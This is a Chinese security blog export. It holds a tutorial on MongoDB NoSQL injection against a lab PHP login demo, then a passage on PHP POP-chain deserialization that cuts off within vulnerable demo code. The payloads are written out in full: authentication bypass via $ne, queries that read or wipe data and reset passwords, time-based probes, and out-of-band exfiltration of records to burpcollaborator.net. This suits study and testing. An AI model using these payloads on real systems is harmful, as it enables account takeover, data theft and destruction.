<p>开始之前先写一点测试数据进mongodb</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use test</span><br><span class="line">db.users.insert(&#123;</span><br><span class="line">	username:&quot;cl0und&quot;,</span><br><span class="line">	password:&quot;cl0und1pass&quot;</span><br><span class="line">&#125;)</span><br><span class="line">db.users.insert(&#123;</span><br><span class="line">	username:&quot;cl0und2&quot;,</span><br><span class="line">	password:&quot;cl0und2pass&quot;</span><br><span class="line">&#125;)</span><br><span class="line">db.users.insert(&#123;</span><br><span class="line">	username:&quot;cl0und3&quot;,</span><br><span class="line">	password:&quot;cl0und3pass&quot;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="回显注入-数组绑定注入">回显注入-数组绑定注入</h2>
<p>偷了一个网上的脚本。可以把他看到成一个简单的登陆验证demo</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;On&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL | E_STRICT);</span><br><span class="line"><span class="comment">//echo extension_loaded(&quot;mongodb&quot;) ? &quot;loaded\n&quot; : &quot;not loaded\n&quot;;</span></span><br><span class="line"><span class="variable">$mongo</span> = <span class="keyword">new</span> <span class="title class_">MongoClient</span>();</span><br><span class="line"><span class="variable">$db</span> = <span class="variable">$mongo</span>-&gt;test; <span class="comment">//选择数据库</span></span><br><span class="line"><span class="variable">$coll</span> = <span class="variable">$db</span>-&gt;users; <span class="comment">//选择集合</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="comment">//var_dump($_GET);</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>=&gt;<span class="variable">$password</span></span><br><span class="line">        );</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$coll</span>-&gt;<span class="title function_ invoke__">find</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$count</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">count</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$count</span>&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;username:&#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;password:&#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;未找到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>正常url <code>http://192.168.62.151/mongo.php?username=cl0und&amp;password=cl0und1pass</code></p>
<p>相当于执行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.users.find(&#123;username:&quot;cl0und&quot;,password:&quot;cl0und1pass&quot;&#125;)</span><br></pre></td></tr></table></figure>
<p><img src="%E6%95%B0%E7%BB%84%E7%BB%91%E5%AE%9A1.png" alt="数组绑定1.png"></p>
<p><img src="demo1.png" alt="demo1.png"></p>
<p>那么结合php可以传数组的特性可以</p>
<p>注入url <code>http://192.168.62.151/mongo.php?username[$ne]=cl0und&amp;password[$ne]=cl0und1pass</code></p>
<p><img src="%E6%95%B0%E7%BB%84%E7%BB%91%E5%AE%9A2.png" alt="数组绑定2.png"></p>
<p>相当于执行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.users.find(&#123;username:&#123;$ne:&quot;cl0und&quot;&#125;,password:&#123;$ne:&quot;cl0und1pass&quot;&#125;&#125;)</span><br></pre></td></tr></table></figure>
<p>这样通过数组的嵌套成功的改变了代码执行的逻辑，下面的例子来自于一次做题</p>
<p><img src="demo2.png" alt="demo2.png"></p>
<p>这里要通过员工的工号才能注册，但是在不知道工号情况下可以尝试注入。抓包可以发现数据是以json格式上传的，以及之前步骤的一些提示可以猜到后台数据库是以mongodb。因为2333这个工号不存在，而jobnumber这个点又有注入，所以成功绕过注册限制。</p>
<p><img src="%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2.png" alt="登陆界面.png"></p>
<p><img src="json%E4%BC%A0%E5%8F%82.png" alt="json传参.png"></p>
<h2 id="回显注入-字符串拼接注入">回显注入-字符串拼接注入</h2>
<p>这种注入特点和传统的sql注入类似，因为程序员直接拼接的sql语句，造成代码与数据边界不清。因为mongoddb是用js来操作的，所以注入语句符合js语法就好。偷脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;var data = db.users.findOne(&#123;username:&#x27;<span class="subst">$username</span>&#x27;,password:&#x27;<span class="subst">$password</span>&#x27;&#125;);return data;&quot;</span>;</span><br><span class="line"><span class="variable">$mongo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mongoclient</span>();</span><br><span class="line"><span class="variable">$db</span> = <span class="variable">$mongo</span>-&gt;test;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">&#x27;ok&#x27;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">&#x27;retval&#x27;</span>]!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;username:&#x27;</span>.<span class="variable">$data</span>[<span class="string">&#x27;retval&#x27;</span>][<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;password:&#x27;</span>.<span class="variable">$data</span>[<span class="string">&#x27;retval&#x27;</span>][<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;未找到&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>[<span class="string">&#x27;errmsg&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>网上的payload靠注释改变代码逻辑，但是实际使用不行，原因大概该是高版本不支持注释的原因<br>
<code>http://192.168.62.151/mongo.php?username=cl0und%27&#125;);return%20&#123;username:1,password:2&#125;;//&amp;password=cl0und1pass1</code></p>
<p>可以改变策略闭合后面的代码<br>
<code>http://192.168.62.151/mongo.php?username=cl0und'&#125;);return (&#123;username:1,password:2&#125;);var foo = (&#123;'foo':'&amp;password=cl0und1pass1</code></p>
<p>然后后续步骤和sql注入类似</p>
<p><img src="%E5%9B%9E%E6%98%BE.png" alt="回显.png"></p>
<p>查看版本()<br>
<code>http://192.168.62.151/mongo.php?username=cl0und'&#125;);return (&#123;username:version(),password:2&#125;);var foo = (&#123;'foo':'</code></p>
<p>查看当前数据库<br>
<code>http://192.168.62.151/mongo.php?username=cl0und'&#125;);return (&#123;username:tojson(db),password:2&#125;);var foo = (&#123;'foo':'</code></p>
<p>查看当前集合<br>
<code>http://192.168.62.151/mongo.php?username=cl0und'&#125;);return &#123;username:tojson(db.getCollectionNames()),password:2&#125;;(&#123;foo:'1&amp;password=123456</code></p>
<p>查看文档<br>
<code>http://192.168.62.151/mongo.php?username=cl0und'&#125;);return &#123;username:tojson(db.users.find()),password:2&#125;;(&#123;foo:'1&amp;password=123456</code></p>
<p>这里貌似一次性不能查看全部，这样会回显一些，看起来像是内部的脚本，暂时不知道是什么</p>
<p><img src="%E9%85%8D%E7%BD%AE%EF%BC%9F.png" alt="配置？.png"></p>
<p>需要一条一条的看</p>
<p><img src="%E4%B8%80%E6%9D%A1%E4%B8%80%E6%9D%A1%E6%9F%A5%E7%9C%8B.png" alt="一条一条查看.png"></p>
<p>联想到多条语句执行，是不是可以插入数据？<br>
<code>http://192.168.62.151/mongo.php?username=cl0und'&#125;);db.users.insert(&#123;username:&quot;localguy&quot;,password:&quot;localguy&quot;&#125;);var foo = (&#123;'foo':'</code></p>
<p>那还能删除数据<br>
<code>http://192.168.62.151/mongo.php?username=cl0und'&#125;);db.users.remove(&#123;username:&quot;localguy&quot;,password:&quot;localguy&quot;&#125;);var foo = (&#123;'foo':'</code></p>
<p>还能删库跑路<br>
<code>http://192.168.62.151/mongo.php?username=cl0und'&#125;);db.users.remove(&#123;&#125;);var foo = (&#123;'foo':'</code></p>
<p>更新别人密码<br>
<code>http://192.168.62.151/mongo.php?username=cl0und'&#125;);db.users.update(&#123;'username':'cl0und'&#125;,&#123;$set:&#123;'password':'hack'&#125;&#125;);var foo = (&#123;'foo':'</code></p>
<h2 id="布尔盲注">布尔盲注</h2>
<p>以一个例子说明，注册一个用户名为cc<strong>true</strong>,这里的功能是根据上传的用户名，查询所管理的机器（没有越权）</p>
<p>当传上去的用户名正常的时候</p>
<p>当不存在用户名，或者身份验证失败的时候</p>
<p><img src="bool1.png" alt="bool1.png"></p>
<p><img src="boo2.png" alt="boo2.png"></p>
<p>测试出注入点</p>
<p>盲注思路是用表达式的结果为true时和cc相加重新变成用户名ccture</p>
<p><img src="bool3.png" alt="bool3.png"></p>
<p>确认版本信息</p>
<p>同样可以用于bool盲注还有$regix操作符</p>
<h2 id="时间盲注">时间盲注</h2>
<p>给个demo<br>
<code>db.users.find(&#123;'$where':'function() &#123;sleep(5000);&#125;'&#125;)</code></p>
<p>在数组绑定的代码下实验这个demo,发现因为mongodb或者php驱动的限制，不能正常用<br>
<code>http://192.168.62.151/mongo.php?username=cl0und&amp;password[$where]=function()&#123;return%20sleep((5000);&#125;</code></p>
<h2 id="带外注入">带外注入</h2>
<p>实际没有用过，仅仅作一种探索</p>
<p>查看版本<br>
<code>db.copyDatabase('cl0und','test',version()+'.wssyoum9pyibk4uaukl9y0okxb31rq.burpcollaborator.net')</code></p>
<p>因为查询出来的json格式有和url标准冲突的特殊字符所以需要剔除，还有每个文档一般都会有一个 _id ,z这个id也往往不那么重要所以也可以剔除。在看文档的想找到mongodb有关base64或者16进制的字符串转换方法，不过很可惜没有找到，所以做了一下的折中处理。</p>
<p><img src="ofb.png" alt="ofb.png"><br>
<code>db.copyDatabase('cl0und','test',tojson(db.users.findOne(&#123;&#125;,&#123;_id:0&#125;)).replace(new RegExp(&quot;:| |,|\&quot;|&#123;|&#125;&quot;,&quot;gm&quot;),&quot;&quot;)+'.e2hvfklnuw3ciolc2r4s9hd9o0uqif.burpcollaborator.net')</code></p>
<p><img src="ofb2.png" alt="ofb2.png"></p>
<h2 id="留坑">留坑</h2>
<ul>
<li>多个mongodb节点数据不一致性</li>
<li>CSRF</li>
</ul>
<h2 id="最后">最后</h2>
<p>寒假快乐</p>
<h2 id="参考">参考</h2>
<p><a href="http://drops.chamd5.org/#!/drops/405.Mongodb%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">http://drops.chamd5.org/#!/drops/405.Mongodb%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB</a></p>
<p><a href="http://03i0.com/2017/10/17/mongodb%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/">http://03i0.com/2017/10/17/mongodb%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/</a></p>
<p><a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection">https://www.owasp.org/index.php/Testing_for_NoSQL_injection</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>POP链学习</title>
    <url>/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<!-- 那么问题来了，一个可控的unserialize点意味着什么？ -->
<!-- more -->
<h3 id="挖掘思路">挖掘思路</h3>
<ul>
<li>能控制反序列化的点</li>
<li>反序列化类有魔术方法</li>
<li>魔术方法里有敏感操作（常规思路）</li>
<li>魔术方法里无敏感操作，但是通过属性（对象）调用了一些函数，恰巧在其他的类中有同名的函数（pop链）</li>
</ul>
<h3 id="demo">demo</h3>
<p>来自的<a href="https://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html">柠檬师傅博客</a>，建议小伙伴们拿到自己先做一下，构造<a href="http://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html">pop的方法</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutputFilter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$matchPattern</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$replacement</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$pattern</span>, <span class="variable">$repl</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;matchPattern = <span class="variable">$pattern</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;replacement = <span class="variable">$repl</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$this</span>-&gt;matchPattern, <span class="variable">$this</span>-&gt;replacement, <span class="variable">$data</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogFileFormat</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$filters</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$endl</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filters</span>, <span class="variable">$endl</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;filters = <span class="variable">$filters</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;endl = <span class="variable">$endl</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$txt</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;filters <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">      <span class="variable">$txt</span> = <span class="variable">$filter</span>-&gt;<span class="title function_ invoke__">filter</span>(<span class="variable">$txt</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\n&#x27;</span>, <span class="variable">$this</span>-&gt;endl, <span class="variable">$txt</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$txt</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogWriter_File</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$format</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$format</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;filename = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;..&quot;</span>, <span class="string">&quot;__&quot;</span>, <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="variable">$filename</span>));</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;format = <span class="variable">$format</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">writeLog</span>(<span class="params"><span class="variable">$txt</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="variable language_">$this</span>-&gt;format-&gt;<span class="title function_ invoke__">format</span>(<span class="variable">$txt</span>);</span><br><span class="line">    <span class="comment">//<span class="doctag">TODO:</span> Modify the address here, and delete this TODO.</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;E:\\WWW\\test\\ctf&quot;</span> . <span class="variable">$this</span>-&gt;filename, <span class="variable">$txt</span>, FILE_APPEND);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$logwriter</span>;<span class="comment">//这里装入LogWriter_File对象</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$writer</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;logwriter = <span class="variable">$writer</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$txt</span></span>) </span>&#123;<span class="comment">//这里偷梁换柱Song的log</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;logwriter-&gt;<span class="title function_ invoke__">writeLog</span>(<span class="variable">$txt</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Song</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$logger</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$group</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$url</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$group</span>, <span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;group = <span class="variable">$group</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;url = <span class="variable">$url</span>;</span><br><span class="line">    <span class="variable">$fltr</span> = <span class="keyword">new</span> <span class="title class_">OutputFilter</span>(<span class="string">&quot;/\[i\](.*)\[\/i\]/i&quot;</span>, <span class="string">&quot;&lt;i&gt;\\1&lt;/i&gt;&quot;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;logger = <span class="keyword">new</span> <span class="title class_">Logger</span>(<span class="keyword">new</span> <span class="title class_">LogWriter_File</span>(<span class="string">&quot;song_views&quot;</span>, <span class="keyword">new</span> <span class="title class_">LogFileFormat</span>(<span class="keyword">array</span>(<span class="variable">$fltr</span>), <span class="string">&quot;\n&quot;</span>)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;a href=&#x27;&quot;</span> . <span class="variable language_">$this</span>-&gt;url . <span class="string">&quot;&#x27;&gt;&lt;i&gt;&quot;</span> . <span class="variable language_">$this</span>-&gt;name . <span class="string">&quot;&lt;/i&gt;&lt;/a&gt; by &quot;</span> . <span class="variable language_">$this</span>-&gt;group;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Song &quot;</span> . <span class="variable">$this</span>-&gt;name . <span class="string">&quot; by [i]&quot;</span> . <span class="variable">$this</span>-&gt;group . <span class="string">&quot;[/i] viewed.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lyrics</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$lyrics</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$song</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$lyrics</span>, <span class="variable">$song</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;song = <span class="variable">$song</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;lyrics = <span class="variable">$lyrics</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;p&gt;&quot;</span> . <span class="variable language_">$this</span>-&gt;song-&gt;<span class="title function_ invoke__">__toString</span>() . <span class="string">&quot;&lt;/p&gt;&lt;p&gt;&quot;</span> . <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&lt;br /&gt;&quot;</span>, <span class="variable">$this</span>-&gt;lyrics) . <span class="string">&quot;&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;song-&gt;<span class="title function_ invoke__">log</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">shortForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;p&gt;&lt;a href=&#x27;song.php?name=&quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="variable">$this</span>-&gt;song-&gt;<span class="title function_ invoke__">get_name</span>()) . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable language_">$this</span>-&gt;song-&gt;<span class="title function_ invoke__">get_name</span>() . <span class="string">&quot;&lt;/a&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">name_is</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;song-&gt;<span class="title function_ invoke__">get_name</span>() === <span class="variable">$name</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">  <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">addLyrics</span>(<span class="params"><span class="variable">$lyrics</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$oldlyrics</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lyrics&#x27;</span>])) &#123;</span><br><span class="line">      <span class="variable">$oldlyrics</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lyrics&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$lyrics</span> <span class="keyword">as</span> <span class="variable">$lyric</span>) <span class="variable">$oldlyrics</span> []= <span class="variable">$lyric</span>;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;lyrics&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$oldlyrics</span>)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getLyrics</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lyrics&#x27;</span>])) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lyrics&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;lyrics&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>))));</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Porter</span> </span>&#123;</span><br><span class="line">  <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exportData</span>(<span class="params"><span class="variable">$lyrics</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$lyrics</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">importData</span>(<span class="params"><span class="variable">$lyrics</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$lyrics</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Conn</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$conn</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$db</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;conn = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$db</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getLyrics</span>(<span class="params"><span class="variable">$lyrics</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$lyrics</span> <span class="keyword">as</span> <span class="variable">$lyric</span>) &#123;</span><br><span class="line">      <span class="variable">$s</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$lyric</span>);</span><br><span class="line">      <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT data FROM lyrics WHERE id=<span class="subst">$s</span>&quot;</span>);</span><br><span class="line">      <span class="keyword">while</span> ((<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_row</span>()) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="variable">$r</span> []= <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$row</span>[<span class="number">0</span>]));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">addLyrics</span>(<span class="params"><span class="variable">$lyrics</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$ids</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$lyrics</span> <span class="keyword">as</span> <span class="variable">$lyric</span>) &#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;INSERT INTO lyrics (data) VALUES (\&quot;&quot;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$lyric</span>)) . <span 